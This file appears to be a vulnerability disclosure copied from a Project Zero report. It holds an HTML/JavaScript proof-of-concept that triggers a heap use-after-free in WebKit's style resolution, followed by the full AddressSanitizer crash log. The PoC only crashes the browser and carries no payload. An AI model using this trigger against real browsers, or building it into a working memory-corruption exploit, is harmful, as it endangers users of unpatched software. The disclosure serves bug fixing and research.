@@ -1,0 +1,162 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1351
+
+There is a use-after-free security vulnerability in WebKit. The vulnerability was confirmed on ASan build of WebKit nightly.
+
+PoC:
+
+=================================================================
+-->
+
+<script>
+function eventhandler1() {
+try { txt.appendChild(kg); } catch(e) { }
+}
+
+function eventhandler2() {
+try { anim.appendChild(kg); } catch(e) { }
+}
+
+function eventhandler3() {
+try { table.scrollIntoView(true); } catch(e) { }
+}
+
+</script>
+<table id="table"></table>
+<form>
+<keygen id="kg" autofocus="autofocus">
+</form>
+<svg>
+<animate id="anim" attributeName="text-anchor" from="middle" to="inherit" onbegin="eventhandler1()" />
+<text id="txt" onload="eventhandler3()">
+<font color="white"></font>
+<select onfocus="eventhandler2()" autofocus="autofocus">
+<textarea>a</textarea>
+<iframe onload="eventhandler1()"></iframe>
+
+<!--
+=================================================================
+
+ASan log:
+
+=================================================================
+==30588==ERROR: AddressSanitizer: heap-use-after-free on address 0x608000077ec8 at pc 0x00010dfdcb30 bp 0x7fff56cdb5a0 sp 0x7fff56cdb598
+READ of size 8 at 0x608000077ec8 thread T0
+==30588==WARNING: invalid path to external symbolizer!
+==30588==WARNING: Failed to use and restart external symbolizer!
+    #0 0x10dfdcb2f in WebCore::RenderStyle::NonInheritedFlags::getValue(unsigned long long, unsigned long long) const (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x46b2f)
+    #1 0x110ce1def in WebCore::Style::TreeResolver::parentBoxStyle() const (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2d4bdef)
+    #2 0x110ce1acc in WebCore::Style::TreeResolver::styleForElement(WebCore::Element&, WebCore::RenderStyle const&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2d4bacc)
+    #3 0x110ce1fc6 in WebCore::Style::TreeResolver::resolveElement(WebCore::Element&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2d4bfc6)
+    #4 0x110ce3f76 in WebCore::Style::TreeResolver::resolveComposedTree() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2d4df76)
+    #5 0x110ce4cc6 in WebCore::Style::TreeResolver::resolve() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2d4ecc6)
+    #6 0x10e72c196 in WebCore::Document::resolveStyle(WebCore::Document::ResolveStyleType) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x796196)
+    #7 0x10eb31887 in WebCore::FrameView::updateLayoutAndStyleIfNeededRecursive() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xb9b887)
+    #8 0x1094e40e6 in WebKit::TiledCoreAnimationDrawingArea::flushLayers() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebKit.framework/Versions/A/WebKit:x86_64+0x5a90e6)
+    #9 0x11005764e in WebCore::LayerFlushScheduler::layerFlushCallback() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x20c164e)
+    #10 0x7fffd52aed36 in __CFRUNLOOP_IS_CALLING_OUT_TO_AN_OBSERVER_CALLBACK_FUNCTION__ (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:x86_64h+0xa6d36)
+    #11 0x7fffd52aeca6 in __CFRunLoopDoObservers (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:x86_64h+0xa6ca6)
+    #12 0x7fffd528f135 in CFRunLoopRunSpecific (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:x86_64h+0x87135)
+    #13 0x7fffd47efebb in RunCurrentEventLoopInMode (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:x86_64+0x30ebb)
+    #14 0x7fffd47efcf0 in ReceiveNextEventCommon (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:x86_64+0x30cf0)
+    #15 0x7fffd47efb25 in _BlockUntilNextEventMatchingListInModeWithFilter (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:x86_64+0x30b25)
+    #16 0x7fffd2d88a53 in _DPSNextEvent (/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit:x86_64+0x46a53)
+    #17 0x7fffd35047ed in -[NSApplication(NSEvent) _nextEventMatchingEventMask:untilDate:inMode:dequeue:] (/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit:x86_64+0x7c27ed)
+    #18 0x7fffd2d7d3da in -[NSApplication run] (/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit:x86_64+0x3b3da)
+    #19 0x7fffd2d47e0d in NSApplicationMain (/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit:x86_64+0x5e0d)
+    #20 0x7fffeac688c6 in _xpc_objc_main (/usr/lib/system/libxpc.dylib:x86_64+0x108c6)
+    #21 0x7fffeac672e3 in xpc_main (/usr/lib/system/libxpc.dylib:x86_64+0xf2e3)
+    #22 0x108f2156c in main (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebKit.framework/Versions/A/XPCServices/com.apple.WebKit.WebContent.xpc/Contents/MacOS/com.apple.WebKit.WebContent.Development:x86_64+0x10000156c)
+    #23 0x7fffeaa0f234 in start (/usr/lib/system/libdyld.dylib:x86_64+0x5234)
+
+0x608000077ec8 is located 40 bytes inside of 88-byte region [0x608000077ea0,0x608000077ef8)
+freed by thread T0 here:
+    #0 0x10c6dc294 in __sanitizer_mz_free (/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/lib/clang/8.1.0/lib/darwin/libclang_rt.asan_osx_dynamic.dylib:x86_64h+0x57294)
+    #1 0x11cb6c650 in bmalloc::Deallocator::deallocateSlowCase(void*) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x1d72650)
+    #2 0x110ce4081 in WebCore::Style::TreeResolver::resolveComposedTree() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2d4e081)
+    #3 0x110ce4cc6 in WebCore::Style::TreeResolver::resolve() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2d4ecc6)
+    #4 0x10e72c196 in WebCore::Document::resolveStyle(WebCore::Document::ResolveStyleType) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x796196)
+    #5 0x10eb31887 in WebCore::FrameView::updateLayoutAndStyleIfNeededRecursive() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xb9b887)
+    #6 0x1094e40e6 in WebKit::TiledCoreAnimationDrawingArea::flushLayers() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebKit.framework/Versions/A/WebKit:x86_64+0x5a90e6)
+    #7 0x11005764e in WebCore::LayerFlushScheduler::layerFlushCallback() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x20c164e)
+    #8 0x7fffd52aed36 in __CFRUNLOOP_IS_CALLING_OUT_TO_AN_OBSERVER_CALLBACK_FUNCTION__ (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:x86_64h+0xa6d36)
+    #9 0x7fffd52aeca6 in __CFRunLoopDoObservers (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:x86_64h+0xa6ca6)
+    #10 0x7fffd528f135 in CFRunLoopRunSpecific (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:x86_64h+0x87135)
+    #11 0x7fffd47efebb in RunCurrentEventLoopInMode (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:x86_64+0x30ebb)
+    #12 0x7fffd47efcf0 in ReceiveNextEventCommon (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:x86_64+0x30cf0)
+    #13 0x7fffd47efb25 in _BlockUntilNextEventMatchingListInModeWithFilter (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:x86_64+0x30b25)
+    #14 0x7fffd2d88a53 in _DPSNextEvent (/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit:x86_64+0x46a53)
+    #15 0x7fffd35047ed in -[NSApplication(NSEvent) _nextEventMatchingEventMask:untilDate:inMode:dequeue:] (/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit:x86_64+0x7c27ed)
+    #16 0x7fffd2d7d3da in -[NSApplication run] (/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit:x86_64+0x3b3da)
+    #17 0x7fffd2d47e0d in NSApplicationMain (/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit:x86_64+0x5e0d)
+    #18 0x7fffeac688c6 in _xpc_objc_main (/usr/lib/system/libxpc.dylib:x86_64+0x108c6)
+    #19 0x7fffeac672e3 in xpc_main (/usr/lib/system/libxpc.dylib:x86_64+0xf2e3)
+    #20 0x108f2156c in main (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebKit.framework/Versions/A/XPCServices/com.apple.WebKit.WebContent.xpc/Contents/MacOS/com.apple.WebKit.WebContent.Development:x86_64+0x10000156c)
+    #21 0x7fffeaa0f234 in start (/usr/lib/system/libdyld.dylib:x86_64+0x5234)
+
+previously allocated by thread T0 here:
+    #0 0x10c6dbd2c in __sanitizer_mz_malloc (/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/lib/clang/8.1.0/lib/darwin/libclang_rt.asan_osx_dynamic.dylib:x86_64h+0x56d2c)
+    #1 0x7fffeab91281 in malloc_zone_malloc (/usr/lib/system/libsystem_malloc.dylib:x86_64+0x2281)
+    #2 0x11cb6cad4 in bmalloc::DebugHeap::malloc(unsigned long) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x1d72ad4)
+    #3 0x11cb6ad6d in bmalloc::Allocator::allocateSlowCase(unsigned long) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x1d70d6d)
+    #4 0x11caf1247 in bmalloc::Allocator::allocate(unsigned long) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x1cf7247)
+    #5 0x11caf063a in WTF::fastMalloc(unsigned long) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x1cf663a)
+    #6 0x1107568e8 in WebCore::RenderStyle::operator new(unsigned long) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x27c08e8)
+    #7 0x1107943b9 in WebCore::RenderStyle::clonePtr(WebCore::RenderStyle const&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x27fe3b9)
+    #8 0x110794388 in WebCore::RenderStyle::createPtr() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x27fe388)
+    #9 0x110ca204d in WebCore::StyleResolver::styleForElement(WebCore::Element const&, WebCore::RenderStyle const*, WebCore::RenderStyle const*, WebCore::RuleMatchingBehavior, WebCore::RenderRegion const*, WebCore::SelectorFilter const*) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2d0c04d)
+    #10 0x110ce1afb in WebCore::Style::TreeResolver::styleForElement(WebCore::Element&, WebCore::RenderStyle const&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2d4bafb)
+    #11 0x110ce1fc6 in WebCore::Style::TreeResolver::resolveElement(WebCore::Element&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2d4bfc6)
+    #12 0x110ce3f76 in WebCore::Style::TreeResolver::resolveComposedTree() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2d4df76)
+    #13 0x110ce4cc6 in WebCore::Style::TreeResolver::resolve() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2d4ecc6)
+    #14 0x10e72c196 in WebCore::Document::resolveStyle(WebCore::Document::ResolveStyleType) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x796196)
+    #15 0x10eb31887 in WebCore::FrameView::updateLayoutAndStyleIfNeededRecursive() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xb9b887)
+    #16 0x1094e40e6 in WebKit::TiledCoreAnimationDrawingArea::flushLayers() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebKit.framework/Versions/A/WebKit:x86_64+0x5a90e6)
+    #17 0x11005764e in WebCore::LayerFlushScheduler::layerFlushCallback() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x20c164e)
+    #18 0x7fffd52aed36 in __CFRUNLOOP_IS_CALLING_OUT_TO_AN_OBSERVER_CALLBACK_FUNCTION__ (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:x86_64h+0xa6d36)
+    #19 0x7fffd52aeca6 in __CFRunLoopDoObservers (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:x86_64h+0xa6ca6)
+    #20 0x7fffd528f135 in CFRunLoopRunSpecific (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:x86_64h+0x87135)
+    #21 0x7fffd47efebb in RunCurrentEventLoopInMode (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:x86_64+0x30ebb)
+    #22 0x7fffd47efcf0 in ReceiveNextEventCommon (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:x86_64+0x30cf0)
+    #23 0x7fffd47efb25 in _BlockUntilNextEventMatchingListInModeWithFilter (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:x86_64+0x30b25)
+    #24 0x7fffd2d88a53 in _DPSNextEvent (/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit:x86_64+0x46a53)
+    #25 0x7fffd35047ed in -[NSApplication(NSEvent) _nextEventMatchingEventMask:untilDate:inMode:dequeue:] (/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit:x86_64+0x7c27ed)
+    #26 0x7fffd2d7d3da in -[NSApplication run] (/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit:x86_64+0x3b3da)
+    #27 0x7fffd2d47e0d in NSApplicationMain (/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit:x86_64+0x5e0d)
+    #28 0x7fffeac688c6 in _xpc_objc_main (/usr/lib/system/libxpc.dylib:x86_64+0x108c6)
+    #29 0x7fffeac672e3 in xpc_main (/usr/lib/system/libxpc.dylib:x86_64+0xf2e3)
+
+SUMMARY: AddressSanitizer: heap-use-after-free (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x46b2f) in WebCore::RenderStyle::NonInheritedFlags::getValue(unsigned long long, unsigned long long) const
+Shadow bytes around the buggy address:
+  0x1c100000ef80: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd
+  0x1c100000ef90: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd
+  0x1c100000efa0: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00
+  0x1c100000efb0: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd
+  0x1c100000efc0: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fa
+=>0x1c100000efd0: fa fa fa fa fd fd fd fd fd[fd]fd fd fd fd fd fa
+  0x1c100000efe0: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 fa
+  0x1c100000eff0: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 fa
+  0x1c100000f000: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 fa
+  0x1c100000f010: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 fa
+  0x1c100000f020: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07 
+  Heap left redzone:       fa
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+==30588==ABORTING
+-->
